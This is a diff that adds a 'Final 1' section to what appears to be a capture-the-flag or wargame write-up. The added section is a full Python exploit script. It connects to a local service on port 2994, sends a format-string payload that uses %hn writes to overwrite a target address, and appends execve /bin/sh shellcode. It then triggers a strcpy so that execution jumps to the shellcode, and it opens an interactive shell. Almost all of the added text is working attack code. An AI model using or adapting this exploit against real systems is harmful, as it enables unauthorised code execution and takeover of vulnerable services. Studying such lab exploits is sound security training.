@@ -1932,3 +1932,46 @@ enjoy your shell ;)
 whoami
 root
 ```
+
+## Final 1
+
+```python 
+#! /usr/bin/python
+import socket
+import struct
+import telnetlib
+
+try:
+    print("[*]Connecting to target")
+    #create socket obj
+    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    #connect the client
+    client.connect ( ('127.0.0.1',2994))
+    target= 0x804a170
+    client.send("username i\n")
+    p = "login ###" 
+    p += struct.pack('<I', target) #target loc
+    p += struct.pack('<I', target+2)
+    p+= "%54992"  #val to write 0xd70c
+    p +="x%20$hn" #offset to hit target loc on stack
+    p +="%10483"  #value to write 0xffff
+    p +="x%21$hn " #stack offset+1
+    p += "\x31\xc0\x50\x68\x2f\x2f\x73"
+    p += "\x68\x68\x2f\x62\x69\x6e\x89"
+    p += "\xe3\x89\xc1\x89\xc2\xb0\x0b"
+    p += "\xcd\x80\x31\xc0\x40\xcd\x80"
+    p += '\n'
+    raw_input("Press Enter to send payload")
+    print("[*]Sending Payload ")
+    client.send(p)
+    client.send("username x\n") #this will make us hit strcpy, which now jumps to shellcode!
+    print("enjoy your shell")
+    #interact w shell
+   
+    t = telnetlib.Telnet()
+    t.sock = client
+ 
+    t.interact()
+except socket.errno:
+    raise
+```
